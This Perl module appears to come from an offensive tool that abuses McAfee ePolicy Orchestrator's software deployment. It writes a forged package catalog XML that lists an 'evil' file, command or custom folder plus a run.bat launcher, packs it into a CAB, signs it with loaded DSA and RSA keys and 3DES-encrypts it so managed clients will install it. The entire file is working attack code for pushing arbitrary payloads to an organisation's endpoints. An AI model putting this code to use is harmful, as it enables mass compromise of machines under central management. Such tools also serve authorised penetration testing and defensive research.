package Epowner::Epo;

use Epowner::Cab::Cab;
use Epowner::CabSign::CabSign;

use File::Path;

use strict;
use warnings;





sub pkgcatalog_makecab {

	my $this = shift;

	my $xmlfile = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_xml_file} ;
	my $cabfile = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_cab_file} ;

	# Generate CAB file
	#my $cab = Epowner::Cab::Cab->new;
	my $cab = Epowner::Cab::Cab->new($this->{lcab_path}, $this->{cabextract_path});
	$cab->makecab($xmlfile, $cabfile, 1);
	
	
}

sub pkgcatalog_signcab {

	my $this = shift;

	# filenames (pkgcatalog)
        my $cabfile = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_cab_file} ;
        my $signedcabfile = $this->{pkgcatalog_tmp_folder} . '/' .  $this->{pkgcatalog_signedcab_file} ;
	
	# filename (keys)
	my $dsa_pub  =  $this->{pkgcatalog_dsa_folder} . '/' . $this->{pkgcatalog_dsa_pub_file} ;
	my $dsa_priv =  $this->{pkgcatalog_dsa_folder} . '/' . $this->{pkgcatalog_dsa_priv_file} ;
	my $rsa_pub  =  $this->{pkgcatalog_rsa_folder} . '/' . $this->{pkgcatalog_rsa_pub_file} ;
	my $rsa_priv =  $this->{pkgcatalog_rsa_folder} . '/' . $this->{pkgcatalog_rsa_priv_file} ;

	
	my $cabsign = Epowner::CabSign::CabSign->new;
	
	# Crypto keys
	$cabsign->load_dsa_pub_from_file( $dsa_pub);
	$cabsign->load_dsa_priv_from_file($dsa_priv);
	$cabsign->load_rsa_priv_from_file($rsa_priv);
	$cabsign->load_rsa_pub_from_file($rsa_pub);

	# sign CAB file
	$cabsign->read_cabfile($cabfile);
	$cabsign->sign_cab();
	$cabsign->write_cabfile_signed($signedcabfile);
	
}

sub pkgcatalog_encrypt {

	my $this = shift;

        my $signedcab = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_signedcab_file} ;
        my $pkgcatalog_z = $this->{pkgcatalog_tmp_folder} . '/' . $this->{pkgcatalog_z_file} ;

	# Read Signed CAB
	my $buf ='';
	open FILE, "$signedcab" or die "Couldn't open $signedcab: $!";
	while (<FILE>){ $buf .= $_; }
	close FILE;

        my $enc = mcafee_3des_encrypt(
		$buf,				# to encrypt
		sha1_hex($this->{des3_symkey})  # 3DES key in hex
	);

	# Write
	open FILE, ">$pkgcatalog_z" or die "Couldn't open $pkgcatalog_z: $!";
	print FILE $enc;
	close FILE;
}



sub pkgcatalog_write_xml {

        my $this = shift;
	my $action = shift; # DEPLOY_FILE or DEPLOY_CMD or DEPLOY_CUSTOM

	my $evil_local_path;
	my $cmd;
	my $custom_folder;

	if($action eq DEPLOY_FILE){
	 	$evil_local_path = shift;    # the file we want to deploy on clients	
	}elsif ($action eq DEPLOY_CMD){
		$cmd = shift;
	}else{
		$custom_folder = shift;
	}


	my $run_bat_path = $this->{deploy_run_bat};	
					# path to temp run.bat
					# this batch file will run our evil file and return.
					# this is important, otherwise the agent will keep the task
					# open until our evil file exits. 
					# The content of this file is generated in ModeDeploy.pm


	my $file_item_evil = '';	# XML <FileItem> for evil file
        my $total_sizeKb =0;		# total size of files in Kb

	if($action eq DEPLOY_FILE){
		# DEPLOY_FILE
		#------------

		# is evil file exists ?
		if(not -f $evil_local_path){
			print "[-] ERROR: (write_pkgcatalog_xml): file '$evil_local_path' not found\n";
			exit;
		}

	        # get evil filename
        	my $evil_filename = fileparse($evil_local_path);
		
		# get evil file size
		my $evil_size = -s $evil_local_path ;
		$total_sizeKb += int($evil_size / 1024);
		

		# get evil file hash
		my $content;
		open FILE, "$evil_local_path" or die "[-] ERROR: (write_pkgcatalog_xml): can't open '$evil_local_path' fo reading\n";
		read FILE, $content, -s FILE;
		close FILE;
		my $evil_sha1 = uc(sha1_hex($content)); # must be upper case

		# Build <FileItem>
		$file_item_evil = << "EOF";
                                <FileItem>
                                        <Name>$evil_filename</Name>
                                        <Size>$evil_size</Size>
                                        <DateTime>1CBB272E220B000</DateTime>
                                        <Hash>$evil_sha1</Hash>
                                </FileItem>
EOF

	}elsif ($action eq DEPLOY_CMD){
		# DEPLOY_CMD
		#-----------
	
		# actually, nothing to do here..

	}else {
		# DEPLOY_CUSTOM
		#--------------

		# custom folder was already checked. pass the check
				
                # read custom folder dir
                opendir DIR, $custom_folder or die "[-] ERROR (write_pkgcatalog_xml): can't open '$custom_folder' directory\n";
                my @files = readdir(DIR);
                close DIR;

                # for each entry; add size in Kb
                foreach my $entry (@files){
                        next if $entry =~ /^\.$|^\.\.$|^run.bat$/;
			# add file size
                        my $size = -s $custom_folder . "/" .$entry ;
                        $total_sizeKb += int($size / 1024);
                
	                # get file hash
	                my $content;
        	        open FILE, "$custom_folder/$entry" or die "[-] ERROR: (write_pkgcatalog_xml): can't open '$custom_folder/$entry' fo reading\n";
                	read FILE, $content, -s FILE;
	                close FILE;
        	        my $sha1 = uc(sha1_hex($content)); # must be upper case

                	# Build <FileItem>
	                $file_item_evil .= << "EOF";
                                <FileItem>
                                        <Name>$entry</Name>
                                        <Size>$size</Size>
                                        <DateTime>1CBB272E220B000</DateTime>
                                        <Hash>$sha1</Hash>
                                </FileItem>
EOF

		}

	}



	# get run_bat filename
	my $run_filename = fileparse($run_bat_path); 
        # get run_bat hash and size
        my $content = '';
        open FILE, "$run_bat_path" or die "[-] ERROR: (write_pkgcatalog_xml): can't open '$run_bat_path' fo reading\n";
        read FILE, $content, -s FILE;
        close FILE;
        my $run_sha1 = uc(sha1_hex($content)); # must be upper case
	my $run_size = -s $run_bat_path ;

	# total size of files in Kb
	$total_sizeKb += int($run_size / 1024);


	# pkgcatalog file/path
        my $folder = $this->{pkgcatalog_tmp_folder};
        my $file = $folder . "/" . $this->{pkgcatalog_xml_file};


        # create temp folder
        mkpath($folder);
        if(not -d $folder){
                print "[-] ERROR (write_pkgcatalog_xml): can't create directory $folder\n";
                exit;
        }


	my $product_id 		= $this->{deploy_evil_product_id};
	my $product_build 	= $this->{deploy_evil_product_build};
	my $product_version 	= $this->{deploy_evil_product_version};
	my $product_name = lc($product_id);

        # open XML file
        open (FILE, ">$file") or die "[-] ERROR (write_pkgcatalog_xml): can't create file $file for writing\n";
        print FILE << "EOF";
<?xml version="1.0" encoding="UTF-8"?>
<PkgCatalog Version="20121228000403">
	<ProductPackage>
		<ProductID>$product_id</ProductID>
		<ProductName>$product_name</ProductName>
		<ProductDescription>$product_name</ProductDescription>
		<ProductDetection Version="3.5.0.257">
			<DetectionScript>
				<Name>fooInstall.McS</Name>
				<Size>52</Size><DateTime>1CBB2E55925B750</DateTime>
				<Hash>A5ACE003AFE7423ABDC86876A8253115C2C84BE5</Hash>
			</DetectionScript>
			<ProductVersion>>$product_version</ProductVersion>
			<PlatformID>W2KW:5:0:4|W2KS:5:0:4|W2KAS:5:0:4|W2KDC:5:0:4|WXPHE:5:1:1|WXPW:5:1:1|WXPE:5:1:2|WXPS:5:2:1|WVST|WVSTS|WNT7W</PlatformID>
		</ProductDetection>
		<ConflictSoftwareList></ConflictSoftwareList>
		<LangPackage>
			<Priority>1</Priority>
			<PackageType>Install</PackageType>
			<LangID>0409</LangID>
			<InstallType>command</InstallType>
			<InstallCommand>$run_filename</InstallCommand>
			<MaxReboot>3</MaxReboot>
			<TotalSize>$total_sizeKb</TotalSize>
			<RebootReturnCode>3010</RebootReturnCode>
			<ExtraSettings>
				<Setting Name="BuildNumber">$product_build</Setting>
			</ExtraSettings>
			<FileList>
                                <FileItem>
                                        <Name>$run_filename</Name>
                                        <Size>$run_size</Size>
                                        <DateTime>1CBB272E220B000</DateTime>
                                        <Hash>$run_sha1</Hash>
                                </FileItem>
				$file_item_evil
			</FileList>
		</LangPackage>
		<Translation>
		</Translation>
	</ProductPackage>
</PkgCatalog>
EOF
	close FILE;
}


1;
